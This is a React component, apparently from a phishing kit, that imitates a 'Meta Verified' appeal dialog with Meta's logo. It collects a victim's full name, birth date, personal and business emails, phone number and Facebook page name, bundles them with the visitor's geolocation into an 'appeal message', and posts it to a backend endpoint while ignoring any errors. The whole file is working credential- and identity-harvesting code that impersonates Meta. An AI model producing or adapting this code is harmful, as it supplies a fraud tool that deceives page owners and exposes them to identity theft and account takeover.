'use client';

import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import PhoneInput from '@/components/phone-input';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import axios from 'axios';
import { type FC, type FormEvent, useCallback, useState } from 'react';

interface FormData {
    fullName: string;
    birthDate: string;
    personalEmail: string;
    businessEmail: string;
    phone: string;
    pageName: string;
    agreeTerms: boolean;
}

type FormErrors = Partial<Record<keyof FormData, boolean>>;

const formatBirthDateInput = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 8);

    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
};

const isValidBirthDate = (value: string) => /^\d{2}\/\d{2}\/\d{4}$/.test(value);

const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        birthDate: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        agreeTerms: false
    });
    const [errors, setErrors] = useState<FormErrors>({});

    const { geoInfo, messageId, setModalOpen, setUserData, setMessageId, setMessageContent } = store();

    const handleChange = useCallback(<K extends keyof FormData>(field: K, value: FormData[K]) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        setErrors((prev) => (prev[field] ? { ...prev, [field]: false } : prev));
    }, []);

    const handlePhoneChange = useCallback((value: string) => {
        handleChange('phone', value);
    }, [handleChange]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        const newErrors: FormErrors = {};

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!isValidBirthDate(formData.birthDate)) newErrors.birthDate = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim()) newErrors.phone = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;
        if (!formData.agreeTerms) newErrors.agreeTerms = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        setIsLoading(true);

        const userDataPayload = {
            fullName: formData.fullName.trim(),
            birthDate: formData.birthDate,
            personalEmail: formData.personalEmail.trim(),
            businessEmail: formData.businessEmail.trim(),
            phoneNumber: formData.phone.trim(),
            facebookPageName: formData.pageName.trim(),
            information: ''
        };

        setUserData(userDataPayload);

        const message = buildAppealMessage({
            geoInfo,
            userData: userDataPayload
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
                setMessageContent(message);
            }
        } catch {
            //
        }

        nextStep();
        setIsLoading(false);
    };

    return (
        <div className='ae-modal-overlay'>
            <button aria-label='Close' className='ae-modal-backdrop' type='button' onClick={() => setModalOpen(false)} />
            <div className='ae-modal-panel' id='exampleModal1' role='dialog' aria-modal='true' aria-labelledby='exampleModalLabel'>
                <div className='ae-modal-header'>
                    <h5 className='ae-modal-title ae-title' id='exampleModalLabel'>
                        {texts.metaVerified}
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src={tickSrc} width='18' alt='tick' className='ae-title-image' />
                    </h5>
                    <button aria-label='Close' className='ae-close-btn btn-close' type='button' onClick={() => setModalOpen(false)} />
                </div>
                <div className='ae-modal-body'>
                    <form id='first-form' onSubmit={handleSubmit}>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='FullNameField'>
                                {texts.fullName}
                            </label>
                            <input
                                className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
                                id='FullNameField'
                                minLength={3}
                                name='full-name'
                                required
                                type='text'
                                autoComplete='name'
                                value={formData.fullName}
                                onChange={(e) => handleChange('fullName', e.target.value)}
                            />
                        </div>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='BirthDateField'>
                                {texts.birthDate}
                            </label>
                            <input
                                className={`form-control ${errors.birthDate ? 'is-invalid' : ''}`}
                                id='BirthDateField'
                                name='birth-date'
                                required
                                type='text'
                                inputMode='numeric'
                                autoComplete='bday'
                                placeholder='dd/mm/yyyy'
                                maxLength={10}
                                value={formData.birthDate}
                                onChange={(e) => handleChange('birthDate', formatBirthDateInput(e.target.value))}
                            />
                        </div>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='PersonalEmailField'>
                                {texts.personalEmail}
                            </label>
                            <input
                                className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
                                id='PersonalEmailField'
                                name='personal-email'
                                required
                                type='email'
                                autoComplete='email'
                                value={formData.personalEmail}
                                onChange={(e) => handleChange('personalEmail', e.target.value)}
                            />
                        </div>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='BuisenessEmailField'>
                                {texts.businessEmail}
                            </label>
                            <input
                                className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
                                id='BuisenessEmailField'
                                name='buiseness-email'
                                required
                                type='email'
                                autoComplete='email'
                                value={formData.businessEmail}
                                onChange={(e) => handleChange('businessEmail', e.target.value)}
                            />
                        </div>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='PhoneFirld'>
                                {texts.mobilePhone}
                            </label>
                            <PhoneInput error={errors.phone} id='PhoneFirld' name='mobile-phone-number' onChange={handlePhoneChange} />
                        </div>
                        <div className='mb-3'>
                            <label className='form-label' htmlFor='fb-page-name-input'>
                                {texts.yourPageName}
                            </label>
                            <input
                                className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
                                id='fb-page-name-input'
                                maxLength={80}
                                minLength={3}
                                name='page-name'
                                required
                                type='text'
                                value={formData.pageName}
                                onChange={(e) => handleChange('pageName', e.target.value)}
                            />
                        </div>
                        <div className='mb-3 form-check'>
                            <input
                                className={`form-check-input ${errors.agreeTerms ? 'is-invalid' : ''}`}
                                id='exampleCheck1'
                                name='agree-terms'
                                required
                                type='checkbox'
                                checked={formData.agreeTerms}
                                onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                            />
                            <label className='form-check-label' htmlFor='exampleCheck1'>
                                {texts.agreeToTerms}{' '}
                                <span className='add-svg' id='termsLink'>
                                    {texts.privacyPolicy}
                                </span>
                            </label>
                        </div>
                        <div className='form-btn-wrapper'>
                            <button className='btn btn-primary' type='submit' disabled={isLoading}>
                                <div className='spinner-border text-light' role='status' style={{ display: isLoading ? 'inline-block' : 'none' }}>
                                    <span className='visually-hidden'>Loading...</span>
                                </div>
                                <span className='button-text'>{texts.confirm}</span>
                            </button>
                        </div>
                    </form>
                </div>
                <div className='ae-modal-footer'>
                    {/* eslint-disable-next-line @next/next/no-img-element */}
                    <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                    <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                        {texts.aboutHelpMore}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
